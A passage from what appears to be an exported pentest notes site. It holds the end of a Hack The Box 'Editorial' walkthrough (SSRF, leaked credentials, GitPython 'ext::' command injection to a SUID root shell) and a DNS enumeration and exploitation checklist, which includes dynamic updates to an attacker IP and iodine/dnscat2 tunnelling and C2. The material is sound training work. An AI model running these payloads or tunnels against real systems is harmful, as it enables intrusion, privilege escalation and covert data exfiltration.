Enumeration</h3>\n<p>Endpoint discovered via SSRF:</p>\n<pre><code class=\"language-text\">http://localhost:5000/api/latest/metadata/messages/authors\n</code></pre>\n<p><strong>SSRF Request (Burp Suite):</strong></p>\n<p><img alt=\"Screenshot_20260216_151601.png\" src=\"img/Screenshot_20260216_151601.png\"></p>\n<p>The POST request to <code>/upload-cover</code> with <code>bookurl</code> set to <code>http://localhost:5000/api/latest/metadata/messages/authors</code> returns <code>static/uploads/e74a2231-3be5-4eeb-94f9-b3443a96b8f6</code>.</p>\n<h3 id=\"credential-leak\">Credential Leak</h3>\n<p>By downloading the file generated by SSRF (<code>GET /static/uploads/e74a2231-3be5-4eeb-94f9-b3443a96b8f6</code>), I obtain a JSON containing an email template with <strong>plaintext credentials</strong>:</p>\n<p><img alt=\"asd.png\" src=\"img/asd.png\"></p>\n<pre><code class=\"language-json\">{\n  &quot;template_mail_message&quot;: &quot;Welcome to the team! We are thrilled to have you on board and can't wait to see the incredible content you'll bring to the table.\\n\\nYour login credentials for our internal forum and authors site are:\\nUsername: dev\\nPassword: dev080217_devAPI!@\\n\\nPlease be sure to change your password as soon as possible for security purposes.\\n\\nDon't hesitate to reach out if you have any questions or ideas - we're always here to support you.\\n\\nBest regards, Editorial Tiempo Arriba Team.&quot;\n}\n</code></pre>\n<p><strong>Obtained credentials:</strong></p>\n<table>\n<thead>\n<tr>\n<th>Username</th>\n<th>Password</th>\n</tr>\n</thead>\n<tbody>\n<tr>\n<td><code>dev</code></td>\n<td><code>dev080217_devAPI!@</code></td>\n</tr>\n</tbody>\n</table>\n<hr>\n<h2 id=\"foothold-ssh-as-dev\">Foothold // SSH as <code>dev</code></h2>\n<p>Login SSH with the credentials obtained from the SSRF:</p>\n<pre><code class=\"language-bash\">ssh dev@editorial.htb\n# Password: dev080217_devAPI!@\n</code></pre>\n<hr>\n<h2 id=\"lateral-movement-dev-prod\">Lateral Movement // dev → prod</h2>\n<h3 id=\"git-repository-in-apps\">Git repository in ~/apps</h3>\n<blockquote>\n<p>Technique: Reconnaissance-and-Information-Gathering</p>\n</blockquote>\n<p>In <code>dev</code>'s home directory, there is a git repository:</p>\n<pre><code class=\"language-bash\">dev@editorial:~/apps$ git log\n</code></pre>\n<p>The commit <code>1e84a036b2f33c59e2390730699a488c65643d28</code> (\"feat: create api to editorial info\") contains the source of the Flask API with <strong>hardcoded</strong> credentials for user <code>prod</code>:</p>\n<pre><code class=\"language-bash\">git show 1e84a036b2f33c59e2390730699a488c65643d28\n</code></pre>\n<pre><code class=\"language-python\">@app.route(api_route + '/authors/message', methods=['GET'])\ndef api_mail_new_authors():\n    return jsonify({\n        'template_mail_message': &quot;...Username: prod\\nPassword: 080217_Producti0n_2023!@\\n...&quot;\n    }) # TODO: replace dev credentials when checks pass\n</code></pre>\n<p><strong><code>prod</code> credentials:</strong></p>\n<table>\n<thead>\n<tr>\n<th>Username</th>\n<th>Password</th>\n</tr>\n</thead>\n<tbody>\n<tr>\n<td><code>prod</code></td>\n<td><code>080217_Producti0n_2023!@</code></td>\n</tr>\n</tbody>\n</table>\n<h3 id=\"ssh-as-prod\">SSH as prod</h3>\n<pre><code class=\"language-bash\">ssh prod@editorial.htb\n# Password: 080217_Producti0n_2023!@\n</code></pre>\n<hr>\n<h2 id=\"privilege-escalation-prod-root\">Privilege Escalation // prod → root</h2>\n<blockquote>\n<p>Methodology: Linux-Security-and-Exploitation — Checklist: privesc-checklist</p>\n</blockquote>\n<h3 id=\"sudo-l\">sudo -l</h3>\n<pre><code class=\"language-bash\">prod@editorial:~$ sudo -l\nUser prod may run the following commands on editorial:\n    (root) /usr/bin/python3 /opt/internal_apps/clone_changes/clone_prod_change.py *\n</code></pre>\n<h3 id=\"script-analysis\">Script Analysis</h3>\n<pre><code class=\"language-python\">#!/usr/bin/python3\nimport os\nimport sys\nfrom git import Repo\n\nos.chdir('/opt/internal_apps/clone_changes')\n\nurl_to_clone = sys.argv[1]\n\nr = Repo.init('', bare=True)\nr.clone_from(url_to_clone, 'new_changes', multi_options=[&quot;-c protocol.ext.allow=always&quot;])\n</code></pre>\n<p>The script uses <strong>GitPython</strong> with <code>clone_from()</code> and explicitly enables the <code>ext</code> protocol (<code>protocol.ext.allow=always</code>). User input (<code>sys.argv[1]</code>) is passed directly as an URL without sanitization.</p>\n<h3 id=\"cve-2022-24439-gitpython-rce\">CVE-2022-24439 // GitPython RCE</h3>\n<blockquote>\n<p><strong>Vulnerability</strong><br>\nGitPython &lt; 3.1.30 is vulnerable to <strong>Remote Code Execution</strong> via git's <code>ext</code> protocol. The <code>ext::</code> protocol allows specifying an arbitrary command as a \"remote helper\", which is executed by the system.</p>\n<p>Ref: https://security.snyk.io/vuln/SNYK-PYTHON-GITPYTHON-3113858</p>\n</blockquote>\n<h3 id=\"exploitation\">Exploitation</h3>\n<p>Direct injection of a reverse shell proved complicated, so a two-step approach was used — copying <code>/bin/bash</code> and setting the SUID bit:</p>\n<pre><code class=\"language-bash\"># Step 1: copy /bin/bash to /tmp/pwn (executed as root via sudo)\nsudo /usr/bin/python3 /opt/internal_apps/clone_changes/clone_prod_change.py \\\n  'ext::cp /bin/bash /tmp/pwn'\n\n# Step 2: set SUID on the copied binary\nsudo /usr/bin/python3 /opt/internal_apps/clone_changes/clone_prod_change.py \\\n  'ext::chmod 4755 /tmp/pwn'\n</code></pre>\n<h3 id=\"root-shell\">Root shell</h3>\n<blockquote>\n<p>SUID Technique: Linux-Security-and-Exploitation</p>\n</blockquote>\n<pre><code class=\"language-bash\">prod@editorial:/tmp$ ls -la pwn\n-rwsr-xr-x  1 root root 1396520 Feb 16 17:35 pwn\n\nprod@editorial:/tmp$ ./pwn -p\npwn-5.1# id\nuid=1000(prod) gid=1000(prod) euid=0(root) groups=1000(prod)\npwn-5.1# whoami\nroot\n</code></pre>\n<blockquote>\n<p><strong>Flag <code>-p</code></strong><br>\nThe <code>-p</code> flag (privileged mode) is necessary to prevent bash from dropping the effective UID. Without <code>-p</code>, bash resets <code>euid</code> to <code>uid</code> and you remain as <code>prod</code>.</p>\n</blockquote>\n<hr>\n<h2 id=\"attack-chain-summary\">Attack Chain Summary</h2>\n<pre><code class=\"language-text\">SSRF (bookurl) → Internal API :5000 → dev credentials\n       ↓\n  SSH dev → Git history → prod credentials\n       ↓\n  SSH prod → sudo GitPython (CVE-2022-24439) → SUID bash → root\n</code></pre>"
    }
  ],
  "enumeration": [
    {
      "title": "DNS — Enumeration and Exploitation Checklist",
      "slug": "dns-enumeration-and-exploitation-checklist",
      "date": "2026·04·10",
      "tags": [
        "htb",
        "dns",
        "enumeration",
        "methodology",
        "enum"
      ],
      "desc": "Quick Order 1. nmap -sC -sV -p 53 &lt;TARGET&gt; — version, scripts 2. Zone transfer (axfr) — always try first 3. Reverse lookup on target IP 4. Subdomain enumeration (brute force wordlist) 5. Check for DNS cache snooping 6. Any record enumeration (MX, TXT, SRV, SOA, NS) 7.…",
      "body": "<h2 id=\"recommended-execution-priority\">Recommended Execution Priority</h2>\n<blockquote>\n<p><strong>Quick Order</strong><br>\n1. <code>nmap -sC -sV -p 53 &lt;TARGET&gt;</code> — version, scripts\n2. Zone transfer (<code>axfr</code>) — always try first\n3. Reverse lookup on target IP\n4. Subdomain enumeration (brute force wordlist)\n5. Check for DNS cache snooping\n6. Any record enumeration (MX, TXT, SRV, SOA, NS)\n7. DNSSEC misconfiguration (NSEC walking)\n8. DNS-based service discovery (<code>_sip</code>, <code>_ldap</code>, <code>_kerberos</code>)\n9. Attempt dynamic updates (unauthenticated)\n10. If AD DNS: enumerate <code>_msdcs</code>, <code>_sites</code>, <code>_tcp</code> SRV records</p>\n</blockquote>\n<hr>\n<h1 id=\"dns-enumeration-exploitation-checklist\">DNS // Enumeration &amp; Exploitation Checklist</h1>\n<blockquote>\n<p><strong>Context</strong><br>\nDNS (Domain Name System) — port <strong>53/tcp</strong> (zone transfers, large queries) and <strong>53/udp</strong> (standard queries).\nFundamental protocol for hostname resolution. On HTB, DNS reveals hidden subdomains, vhosts, internal hostnames, and AD structure. Zone transfers are a classic quick win. AD-integrated DNS is especially rich — SRV records map the entire domain infrastructure.</p>\n</blockquote>\n<hr>\n<h2 id=\"0-detection-version-enumeration\">0 // Detection &amp; Version Enumeration</h2>\n<ul class=\"task-list\">\n<li class=\"task-list-item\"><label class=\"task-list-control\"><input type=\"checkbox\"/><span class=\"task-list-indicator\"></span></label> Nmap — identify DNS and version</li>\n</ul>\n<pre><code class=\"language-bash\">nmap -sC -sV -p 53 &lt;TARGET&gt;\nnmap -sV --script=dns* -p 53 &lt;TARGET&gt;\nnmap -sU -sV -p 53 &lt;TARGET&gt;   # UDP\n</code></pre>\n<ul class=\"task-list\">\n<li class=\"task-list-item\"><label class=\"task-list-control\"><input type=\"checkbox\"/><span class=\"task-list-indicator\"></span></label> Banner grabbing / version detection</li>\n</ul>\n<pre><code class=\"language-bash\"># dig version query (BIND)\ndig @&lt;TARGET&gt; version.bind CHAOS TXT\ndig @&lt;TARGET&gt; hostname.bind CHAOS TXT\ndig @&lt;TARGET&gt; authors.bind CHAOS TXT\n\n# nmap script\nnmap --script=dns-nsid -p 53 &lt;TARGET&gt;\n</code></pre>\n<blockquote>\n<p><strong>Version reveals</strong><br>\n- <strong>BIND</strong> version → search CVEs (<code>searchsploit bind 9.x.x</code>)\n- <strong>Microsoft DNS</strong> → likely AD-integrated, enumerate SRV records\n- <strong>dnsmasq</strong> → check for CVEs (DNSpooq: CVE-2020-25681 through CVE-2020-25687)\n- Version hidden? Try <code>dig @&lt;TARGET&gt; version.bind CHAOS TXT</code> — many admins forget to disable this</p>\n</blockquote>\n<ul class=\"task-list\">\n<li class=\"task-list-item\"><label class=\"task-list-control\"><input type=\"checkbox\"/><span class=\"task-list-indicator\"></span></label> Verify DNS resolution works</li>\n</ul>\n<pre><code class=\"language-bash\">dig @&lt;TARGET&gt; &lt;DOMAIN&gt;\nnslookup &lt;DOMAIN&gt; &lt;TARGET&gt;\n</code></pre>\n<hr>\n<h2 id=\"1-zone-transfer-axfr\">1 // Zone Transfer (AXFR)</h2>\n<blockquote>\n<p><strong>First check — always</strong><br>\nA successful zone transfer dumps the entire DNS zone: all hostnames, IPs, aliases, mail servers. This is the single highest-value DNS attack.</p>\n</blockquote>\n<ul class=\"task-list\">\n<li class=\"task-list-item\"><label class=\"task-list-control\"><input type=\"checkbox\"/><span class=\"task-list-indicator\"></span></label> Attempt zone transfer</li>\n</ul>\n<pre><code class=\"language-bash\"># dig\ndig @&lt;TARGET&gt; &lt;DOMAIN&gt; axfr\n\n# host\nhost -l &lt;DOMAIN&gt; &lt;TARGET&gt;\n\n# dnsrecon\ndnsrecon -d &lt;DOMAIN&gt; -n &lt;TARGET&gt; -t axfr\n\n# nmap\nnmap --script=dns-zone-transfer -p 53 --script-args dns-zone-transfer.domain=&lt;DOMAIN&gt; &lt;TARGET&gt;\n</code></pre>\n<ul class=\"task-list\">\n<li class=\"task-list-item\"><label class=\"task-list-control\"><input type=\"checkbox\"/><span class=\"task-list-indicator\"></span></label> Try IXFR (incremental transfer)</li>\n</ul>\n<pre><code class=\"language-bash\">dig @&lt;TARGET&gt; &lt;DOMAIN&gt; ixfr=0\n</code></pre>\n<blockquote>\n<p><strong>What to look for in zone transfer output</strong><br>\n- <strong>A/AAAA records</strong> → new hosts to scan\n- <strong>CNAME records</strong> → aliases, potential vhosts\n- <strong>MX records</strong> → mail servers, often internal\n- <strong>NS records</strong> → additional nameservers\n- <strong>TXT records</strong> → SPF, DKIM, verification tokens, sometimes passwords\n- <strong>SRV records</strong> → internal services (<code>_ldap</code>, <code>_kerberos</code>, <code>_sip</code>)\n- <strong>PTR records</strong> → reverse mappings</p>\n</blockquote>\n<hr>\n<h2 id=\"2-subdomain-record-enumeration\">2 // Subdomain &amp; Record Enumeration</h2>\n<h3 id=\"21-subdomain-brute-force\">2.1 // Subdomain Brute Force</h3>\n<ul class=\"task-list\">\n<li class=\"task-list-item\"><label class=\"task-list-control\"><input type=\"checkbox\"/><span class=\"task-list-indicator\"></span></label> dnsrecon</li>\n</ul>\n<pre><code class=\"language-bash\">dnsrecon -d &lt;DOMAIN&gt; -n &lt;TARGET&gt; -t brt -D /usr/share/seclists/Discovery/DNS/subdomains-top1million-5000.txt\ndnsrecon -d &lt;DOMAIN&gt; -n &lt;TARGET&gt; -t brt -D /usr/share/seclists/Discovery/DNS/namelist.txt\n</code></pre>\n<ul class=\"task-list\">\n<li class=\"task-list-item\"><label class=\"task-list-control\"><input type=\"checkbox\"/><span class=\"task-list-indicator\"></span></label> dnsenum</li>\n</ul>\n<pre><code class=\"language-bash\">dnsenum --dnsserver &lt;TARGET&gt; --enum -f /usr/share/seclists/Discovery/DNS/subdomains-top1million-5000.txt &lt;DOMAIN&gt;\n</code></pre>\n<ul class=\"task-list\">\n<li class=\"task-list-item\"><label class=\"task-list-control\"><input type=\"checkbox\"/><span class=\"task-list-indicator\"></span></label> gobuster dns</li>\n</ul>\n<pre><code class=\"language-bash\">gobuster dns -d &lt;DOMAIN&gt; -r &lt;TARGET&gt;:53 -w /usr/share/seclists/Discovery/DNS/subdomains-top1million-5000.txt\n</code></pre>\n<ul class=\"task-list\">\n<li class=\"task-list-item\"><label class=\"task-list-control\"><input type=\"checkbox\"/><span class=\"task-list-indicator\"></span></label> fierce</li>\n</ul>\n<pre><code class=\"language-bash\">fierce --domain &lt;DOMAIN&gt; --dns-servers &lt;TARGET&gt; --subdomain-file /usr/share/seclists/Discovery/DNS/subdomains-top1million-5000.txt\n</code></pre>\n<ul class=\"task-list\">\n<li class=\"task-list-item\"><label class=\"task-list-control\"><input type=\"checkbox\"/><span class=\"task-list-indicator\"></span></label> ffuf (vhost fuzzing via HTTP, complementary)</li>\n</ul>\n<pre><code class=\"language-bash\">ffuf -u http://&lt;TARGET&gt; -H &quot;Host: FUZZ.&lt;DOMAIN&gt;&quot; -w /usr/share/seclists/Discovery/DNS/subdomains-top1million-5000.txt -fs &lt;baseline_size&gt;\n</code></pre>\n<h3 id=\"22-enumerate-all-record-types\">2.2 // Enumerate All Record Types</h3>\n<ul class=\"task-list\">\n<li class=\"task-list-item\"><label class=\"task-list-control\"><input type=\"checkbox\"/><span class=\"task-list-indicator\"></span></label> Common record types</li>\n</ul>\n<pre><code class=\"language-bash\">dig @&lt;TARGET&gt; &lt;DOMAIN&gt; ANY\ndig @&lt;TARGET&gt; &lt;DOMAIN&gt; A\ndig @&lt;TARGET&gt; &lt;DOMAIN&gt; AAAA\ndig @&lt;TARGET&gt; &lt;DOMAIN&gt; MX\ndig @&lt;TARGET&gt; &lt;DOMAIN&gt; NS\ndig @&lt;TARGET&gt; &lt;DOMAIN&gt; TXT\ndig @&lt;TARGET&gt; &lt;DOMAIN&gt; SOA\ndig @&lt;TARGET&gt; &lt;DOMAIN&gt; CNAME\ndig @&lt;TARGET&gt; &lt;DOMAIN&gt; SRV\ndig @&lt;TARGET&gt; &lt;DOMAIN&gt; PTR\n</code></pre>\n<ul class=\"task-list\">\n<li class=\"task-list-item\"><label class=\"task-list-control\"><input type=\"checkbox\"/><span class=\"task-list-indicator\"></span></label> dnsrecon standard enumeration</li>\n</ul>\n<pre><code class=\"language-bash\">dnsrecon -d &lt;DOMAIN&gt; -n &lt;TARGET&gt; -t std\n</code></pre>\n<blockquote>\n<p><strong>TXT records are goldmines</strong><br>\nTXT records may contain:\n- SPF configurations → reveals mail infrastructure\n- DKIM keys\n- Domain verification tokens (Google, Microsoft, AWS)\n- Freeform text — sometimes credentials or internal notes\n<code>bash\ndig @&lt;TARGET&gt; &lt;DOMAIN&gt; TXT +short\ndig @&lt;TARGET&gt; _dmarc.&lt;DOMAIN&gt; TXT</code></p>\n</blockquote>\n<hr>\n<h2 id=\"3-reverse-dns-lookups\">3 // Reverse DNS Lookups</h2>\n<ul class=\"task-list\">\n<li class=\"task-list-item\"><label class=\"task-list-control\"><input type=\"checkbox\"/><span class=\"task-list-indicator\"></span></label> Single IP reverse lookup</li>\n</ul>\n<pre><code class=\"language-bash\">dig @&lt;TARGET&gt; -x &lt;IP&gt;\nhost &lt;IP&gt; &lt;TARGET&gt;\nnslookup &lt;IP&gt; &lt;TARGET&gt;\n</code></pre>\n<ul class=\"task-list\">\n<li class=\"task-list-item\"><label class=\"task-list-control\"><input type=\"checkbox\"/><span class=\"task-list-indicator\"></span></label> Reverse lookup sweep (subnet)</li>\n</ul>\n<pre><code class=\"language-bash\">dnsrecon -d &lt;DOMAIN&gt; -n &lt;TARGET&gt; -r &lt;SUBNET&gt;/24 -t rvl\n\n# Manual sweep\nfor ip in $(seq 1 254); do dig @&lt;TARGET&gt; -x 10.10.10.$ip +short; done 2&gt;/dev/null | grep -v &quot;^$&quot;\n</code></pre>\n<blockquote>\n<p><strong>Why reverse DNS matters</strong><br>\nReverse lookups reveal hostnames that may not appear in forward zones. Particularly useful for finding internal servers, printers, and network devices that aren't publicly named.</p>\n</blockquote>\n<hr>\n<h2 id=\"4-active-directory-dns-enumeration\">4 // Active Directory DNS Enumeration</h2>\n<blockquote>\n<p><strong>AD-Integrated DNS</strong><br>\nActive Directory relies heavily on DNS. SRV records expose domain controllers, Kerberos services, LDAP, and site topology. If port 53 is open on a Windows box, this is likely a DC.</p>\n</blockquote>\n<ul class=\"task-list\">\n<li class=\"task-list-item\"><label class=\"task-list-control\"><input type=\"checkbox\"/><span class=\"task-list-indicator\"></span></label> Identify Domain Controllers</li>\n</ul>\n<pre><code class=\"language-bash\">dig @&lt;TARGET&gt; _ldap._tcp.dc._msdcs.&lt;DOMAIN&gt; SRV\ndig @&lt;TARGET&gt; _kerberos._tcp.&lt;DOMAIN&gt; SRV\ndig @&lt;TARGET&gt; _gc._tcp.&lt;DOMAIN&gt; SRV          # Global Catalog\n</code></pre>\n<ul class=\"task-list\">\n<li class=\"task-list-item\"><label class=\"task-list-control\"><input type=\"checkbox\"/><span class=\"task-list-indicator\"></span></label> Enumerate AD sites</li>\n</ul>\n<pre><code class=\"language-bash\">dig @&lt;TARGET&gt; _ldap._tcp.&lt;SITENAME&gt;._sites.dc._msdcs.&lt;DOMAIN&gt; SRV\n</code></pre>\n<ul class=\"task-list\">\n<li class=\"task-list-item\"><label class=\"task-list-control\"><input type=\"checkbox\"/><span class=\"task-list-indicator\"></span></label> Kerberos KDC discovery</li>\n</ul>\n<pre><code class=\"language-bash\">dig @&lt;TARGET&gt; _kerberos._udp.&lt;DOMAIN&gt; SRV\ndig @&lt;TARGET&gt; _kpasswd._tcp.&lt;DOMAIN&gt; SRV\n</code></pre>\n<ul class=\"task-list\">\n<li class=\"task-list-item\"><label class=\"task-list-control\"><input type=\"checkbox\"/><span class=\"task-list-indicator\"></span></label> Additional AD SRV records</li>\n</ul>\n<pre><code class=\"language-bash\"># All SRV records at once\ndig @&lt;TARGET&gt; _ldap._tcp.&lt;DOMAIN&gt; SRV\ndig @&lt;TARGET&gt; _ldaps._tcp.&lt;DOMAIN&gt; SRV\ndig @&lt;TARGET&gt; _kerberos._tcp.&lt;DOMAIN&gt; SRV\ndig @&lt;TARGET&gt; _kpasswd._udp.&lt;DOMAIN&gt; SRV\ndig @&lt;TARGET&gt; _sip._tcp.&lt;DOMAIN&gt; SRV\ndig @&lt;TARGET&gt; _sipfederationtls._tcp.&lt;DOMAIN&gt; SRV\n</code></pre>\n<ul class=\"task-list\">\n<li class=\"task-list-item\"><label class=\"task-list-control\"><input type=\"checkbox\"/><span class=\"task-list-indicator\"></span></label> Forest/domain trust enumeration</li>\n</ul>\n<pre><code class=\"language-bash\">dig @&lt;TARGET&gt; _ldap._tcp.dc._msdcs.&lt;FOREST_ROOT&gt; SRV\n</code></pre>\n<ul class=\"task-list\">\n<li class=\"task-list-item\"><label class=\"task-list-control\"><input type=\"checkbox\"/><span class=\"task-list-indicator\"></span></label> Full AD DNS enumeration with dnsrecon</li>\n</ul>\n<pre><code class=\"language-bash\">dnsrecon -d &lt;DOMAIN&gt; -n &lt;TARGET&gt; -t srv\n</code></pre>\n<hr>\n<h2 id=\"5-dns-cache-snooping\">5 // DNS Cache Snooping</h2>\n<blockquote>\n<p><strong>Cache snooping</strong><br>\nIf the DNS server responds to non-recursive queries for cached domains, you can determine which domains have been recently resolved — revealing what sites/services internal users access.</p>\n</blockquote>\n<ul class=\"task-list\">\n<li class=\"task-list-item\"><label class=\"task-list-control\"><input type=\"checkbox\"/><span class=\"task-list-indicator\"></span></label> Non-recursive query (cache check)</li>\n</ul>\n<pre><code class=\"language-bash\"># rd=0 disables recursion // only returns if cached\ndig @&lt;TARGET&gt; example.com A +norecurse\n\n# nmap script\nnmap --script=dns-cache-snoop -p 53 --script-args dns-cache-snoop.domains={google.com,facebook.com,internal.corp} &lt;TARGET&gt;\n</code></pre>\n<hr>\n<h2 id=\"6-dnssec-enumeration\">6 // DNSSEC Enumeration</h2>\n<ul class=\"task-list\">\n<li class=\"task-list-item\"><label class=\"task-list-control\"><input type=\"checkbox\"/><span class=\"task-list-indicator\"></span></label> Check DNSSEC support</li>\n</ul>\n<pre><code class=\"language-bash\">dig @&lt;TARGET&gt; &lt;DOMAIN&gt; DNSKEY\ndig @&lt;TARGET&gt; &lt;DOMAIN&gt; DS\ndig @&lt;TARGET&gt; &lt;DOMAIN&gt; RRSIG\n</code></pre>\n<ul class=\"task-list\">\n<li class=\"task-list-item\"><label class=\"task-list-control\"><input type=\"checkbox\"/><span class=\"task-list-indicator\"></span></label> NSEC walking (enumerate zone without transfer)</li>\n</ul>\n<pre><code class=\"language-bash\"># NSEC records reveal the next hostname alphabetically\n# This allows full zone enumeration even without AXFR\n\n# ldns-walk\nldns-walk @&lt;TARGET&gt; &lt;DOMAIN&gt;\n\n# dnsrecon\ndnsrecon -d &lt;DOMAIN&gt; -n &lt;TARGET&gt; -t snoop\n\n# nmap\nnmap --script=dns-nsec-enum --script-args dns-nsec-enum.domains=&lt;DOMAIN&gt; -p 53 &lt;TARGET&gt;\nnmap --script=dns-nsec3-enum -p 53 --script-args dns-nsec3-enum.domains=&lt;DOMAIN&gt; &lt;TARGET&gt;\n</code></pre>\n<blockquote>\n<p><strong>NSEC vs NSEC3</strong><br>\n- <strong>NSEC</strong> — directly reveals next domain name. Walk trivially.\n- <strong>NSEC3</strong> — hashes domain names. Requires offline cracking (<code>nsec3walker</code>, <code>hashcat -m 8300</code>).</p>\n</blockquote>\n<hr>\n<h2 id=\"7-dynamic-dns-updates\">7 // Dynamic DNS Updates</h2>\n<blockquote>\n<p><strong>Unauthenticated dynamic updates = full control</strong><br>\nIf the DNS server accepts unauthenticated updates, you can add/modify/delete any record.</p>\n</blockquote>\n<ul class=\"task-list\">\n<li class=\"task-list-item\"><label class=\"task-list-control\"><input type=\"checkbox\"/><span class=\"task-list-indicator\"></span></label> Test unauthenticated update</li>\n</ul>\n<pre><code class=\"language-bash\"># nsupdate\nnsupdate &lt;&lt;EOF\nserver &lt;TARGET&gt;\nzone &lt;DOMAIN&gt;\nupdate add evil.&lt;DOMAIN&gt; 86400 A &lt;ATTACKER_IP&gt;\nsend\nEOF\n\n# nmap\nnmap --script=dns-update --script-args=dns-update.hostname=evil.&lt;DOMAIN&gt;,dns-update.ip=&lt;ATTACKER_IP&gt; -p 53 &lt;TARGET&gt;\n</code></pre>\n<blockquote>\n<p><strong>Exploitation via dynamic update</strong><br>\n- <strong>Redirect traffic</strong> — point legitimate hostnames to attacker IP\n- <strong>Add new A record</strong> — create a subdomain for phishing or to serve payloads\n- <strong>MX poisoning</strong> — redirect email to attacker mail server\n- <strong>Wildcard injection</strong> — <code>*.domain → attacker IP</code> captures all undefined subdomains</p>\n</blockquote>\n<hr>\n<h2 id=\"8-dns-tunneling-exfiltration\">8 // DNS Tunneling &amp; Exfiltration</h2>\n<blockquote>\n<p><strong>DNS as covert channel</strong><br>\nDNS traffic is rarely blocked. Tools can tunnel TCP over DNS queries, exfiltrate data in subdomains, or establish C2 channels.</p>\n</blockquote>\n<ul class=\"task-list\">\n<li class=\"task-list-item\"><label class=\"task-list-control\"><input type=\"checkbox\"/><span class=\"task-list-indicator\"></span></label> Detect DNS tunneling (defensive)</li>\n</ul>\n<pre><code class=\"language-bash\"># Look for unusually long subdomains, high query volume, TXT record abuse\ntcpdump -i tun0 port 53 -w dns_capture.pcap\ntshark -r dns_capture.pcap -T fields -e dns.qry.name | sort | uniq -c | sort -rn | head -20\n</code></pre>\n<ul class=\"task-list\">\n<li class=\"task-list-item\"><label class=\"task-list-control\"><input type=\"checkbox\"/><span class=\"task-list-indicator\"></span></label> iodine (IP over DNS)</li>\n</ul>\n<pre><code class=\"language-bash\"># Server (attacker)\nsudo iodined -f -c -P &lt;PASSWORD&gt; 10.0.0.1 tunnel.&lt;ATTACKER_DOMAIN&gt;\n\n# Client (target)\niodine -f -P &lt;PASSWORD&gt; &lt;DNS_SERVER&gt; tunnel.&lt;ATTACKER_DOMAIN&gt;\n</code></pre>\n<ul class=\"task-list\">\n<li class=\"task-list-item\"><label class=\"task-list-control\"><input type=\"checkbox\"/><span class=\"task-list-indicator\"></span></label> dnscat2 (C2 over DNS)</li>\n</ul>\n<pre><code class=\"language-bash\"># Server (attacker)\ndnscat2-server &lt;ATTACKER_DOMAIN&gt;\n\n# Client (target)\n./dnscat --dns=server=&lt;DNS_SERVER&gt;,domain=&lt;ATTACKER_DOMAIN&gt;\n</code></pre>\n<hr>\n<h2 id=\"9-notable-cves\">9 // Notable CVEs</h2>\n<h3 id=\"bind-cve-2021-25216-gss-tsig-buffer-overflow\">BIND // CVE-2021-25216 (GSS-TSIG buffer overflow)</h3>\n<pre><code class=\"language-bash\"># BIND 9.5.0 // 9.11.31, 9.12.0 // 9.16.15, 9.17.0 // 9.17.12\n# Buffer overflow in GSS-TSIG negotiation\nsearchsploit bind 9\ndig @&lt;TARGET&gt; version.bind CHAOS TXT   # confirm version\n</code></pre>\n<h3 id=\"bind-cve-2020-8617-tsig-dos-assertion-failure\">BIND // CVE-2020-8617 (TSIG DoS / assertion failure)</h3>\n<pre><code class=\"language-bash\"># BIND 9.x // crafted TSIG causes assertion failure\n# Denial of service\n</code></pre>\n<h3 id=\"dnsmasq-dnspooq-cve-2020-25681-to-25687\">dnsmasq // DNSpooq (CVE-2020-25681 to 25687)</h3>\n<pre><code class=\"language-bash\"># Buffer overflow and cache poisoning in dnsmasq &lt; 2.83\n# Affects routers, IoT, embedded systems\nsearchsploit dnsmasq\n</code></pre>\n<h3 id=\"microsoft-dns-sigred-cve-2020-1350\">Microsoft DNS // SIGRed (CVE-2020-1350)</h3>\n<pre><code class=\"language-bash\"># Windows DNS Server // wormable RCE via crafted SIG record\n# Affects Windows Server 2003 // 2019\n# CVSS 10.0\n\n# Check\nnmap --script=dns-nsid -p 53 &lt;TARGET&gt;\n# If Microsoft DNS → check patch level\n\n# PoC\nsearchsploit sigred\nsearchsploit CVE-2020-1350\n</code></pre>\n<h3 id=\"microsoft-dns-cve-2021-26877-cve-2021-26897\">Microsoft DNS // CVE-2021-26877 / CVE-2021-26897</h3>\n<pre><code class=\"language-bash\"># Windows DNS Server RCE via dynamic updates\n# Requires ability to send dynamic update\n</code></pre>\n<hr>\n<h2 id=\"10-wildcard-subdomain-takeover\">10 // Wildcard &amp; Subdomain Takeover</h2>\n<ul class=\"task-list\">\n<li class=\"task-list-item\"><label class=\"task-list-control\"><input type=\"checkbox\"/><span class=\"task-list-indicator\"></span></label> Detect wildcard DNS</li>\n</ul>\n<pre><code class=\"language-bash\"># Query a non-existent subdomain\ndig @&lt;TARGET&gt; nonexistent12345.&lt;DOMAIN&gt; A\n# If it resolves → wildcard configured\n</code></pre>\n<ul class=\"task-list\">\n<li class=\"task-list-item\"><label class=\"task-list-control\"><input type=\"checkbox\"/><span class=\"task-list-indicator\"></span></label> Subdomain takeover (if CNAME points to unclaimed resource)</li>\n</ul>\n<pre><code class=\"language-bash\"># Look for CNAMEs pointing to cloud services\ndig @&lt;TARGET&gt; &lt;SUBDOMAIN&gt;.&lt;DOMAIN&gt; CNAME +short\n# If CNAME target is NXDOMAIN or unclaimed → potential takeover\n# Common targets: *.s3.amazonaws.com, *.herokuapp.com, *.azurewebsites.net, *.github.io\n</code></pre>\n<hr>\n<h2 id=\"11-useful-one-liners\">11 // Useful One-Liners</h2>\n<pre><code class=\"language-bash\"># Full DNS audit with dnsrecon\ndnsrecon -d &lt;DOMAIN&gt; -n &lt;TARGET&gt; -a -s -w -z\n\n# Resolve all found subdomains\ncat subdomains.txt | while read sub; do dig @&lt;TARGET&gt; $sub.&lt;DOMAIN&gt; +short; done\n\n# Extract unique IPs from zone transfer\ndig @&lt;TARGET&gt; &lt;DOMAIN&gt; axfr | grep -E &quot;IN\\s+A\\s+&quot; | awk '{print $NF}' | sort -u\n\n# Mass reverse lookup\ndnsrecon -n &lt;TARGET&gt; -r &lt;SUBNET&gt;/24 -t rvl -j dns_reverse.json\n\n# Add discovered domains to /etc/hosts\necho &quot;&lt;TARGET_IP&gt; &lt;DOMAIN&gt; sub1.&lt;DOMAIN&gt; sub2.&lt;DOMAIN&gt;&quot; | sudo tee -a /etc/hosts\n</code></pre>\n<hr>\n<h2 id=\"related-machines\">Related Machines</h2>\n<table>\n<thead>\n<tr>\n<th>Machine</th>\n<th>Technique</th>\n</tr>\n</thead>\n<tbody>\n<tr>\n<td>BoardLight</td>\n<td>Virtual-host fuzzing uncovers <code>crm.board.htb</code> running Dolibarr — main domain is a decoy static page</td>\n</tr>\n<tr>\n<td>Devvortex</td>\n<td>Virtual-host fuzzing finds <code>dev.devvortex.htb</code> (Joomla admin) that the main domain hides</td>\n</tr>\n<tr>\n<td>Escape</td>\n<td>DNS/LDAP/Kerberos cluster signature identifies the host as a 